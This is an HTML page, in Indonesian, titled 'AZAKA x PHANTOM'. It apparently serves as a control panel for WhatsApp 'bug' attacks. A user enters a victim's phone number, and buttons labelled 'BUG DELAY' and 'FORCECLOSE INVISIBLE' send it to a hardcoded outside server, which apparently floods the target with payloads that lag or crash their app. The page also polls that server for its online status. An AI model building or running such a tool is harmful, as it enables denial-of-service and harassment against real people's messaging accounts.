<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>AZAKA x PHANTOM</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('bg.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: sans-serif;
      color: white;
      text-align: center;
    }

    .container {
      margin-top: 80px;
      padding: 20px;
    }

    h1 {
      font-size: 32px;
      color: red;
      margin-bottom: 30px;
    }

    input[type="text"] {
      padding: 10px;
      border: none;
      border-radius: 10px;
      width: 80%;
      max-width: 300px;
      margin-bottom: 20px;
    }

    .btn {
      background-color: crimson;
      color: white;
      padding: 12px 24px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    .btn:hover {
      background-color: darkred;
    }

    .status {
      margin-top: 30px;
      font-weight: bold;
      color: yellow;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>AZAKA x PHANTOM</h1>

    <input type="text" id="target" placeholder="Masukkan nomor target (62xxxx)" />
    <br />

    <button class="btn" onclick="sendAPI('delay')">BUG DELAY</button>
    <button class="btn" onclick="sendAPI('fcin')">FORCECLOSE INVISIBLE</button>

    <div class="status" id="status">‚è≥ Mengecek status...</div>
  </div>

  <script>
    function sendAPI(type) {
      const number = document.getElementById("target").value.trim();

      if (!number || !number.startsWith("62") || number.length < 10) {
        alert("Masukkan nomor yang valid, dimulai dengan 62.");
        return;
      }

      let url = "";
      if (type === "delay") {
        url = `http://46.101.32.52:2004/evolution?type=delay&chatId=${number}@s.whatsapp.net`;
      } else if (type === "fcin") {
        url = `http://46.101.32.52:2004/evolution?type=fcin&chatId=${number}@s.whatsapp.net`;
      }

      console.log("Kirim ke API:", url);

      fetch(url)
        .then(res => res.text())
        .then(data => {
          document.getElementById("status").innerText = `‚úÖ Dikirim: ${data}`;
        })
        .catch(err => {
          console.error("Gagal kirim:", err);
          document.getElementById("status").innerText = "‚ùå Gagal mengirim.";
        });
    }

    function cekStatus() {
      fetch("http://46.101.32.52:2004/status")
        .then(res => res.text())
        .then(data => {
          const s = document.getElementById("status");
          if (data.trim() === "true") {
            s.innerText = "üü¢ STATUS: ONLINE";
            s.style.color = "lightgreen";
          } else {
            s.innerText = "üî¥ STATUS: OFFLINE";
            s.style.color = "red";
          }
        })
        .catch(() => {
          document.getElementById("status").innerText = "‚ö†Ô∏è Tidak bisa cek status";
        });
    }

    cekStatus();
  </script>
</body>
</html>
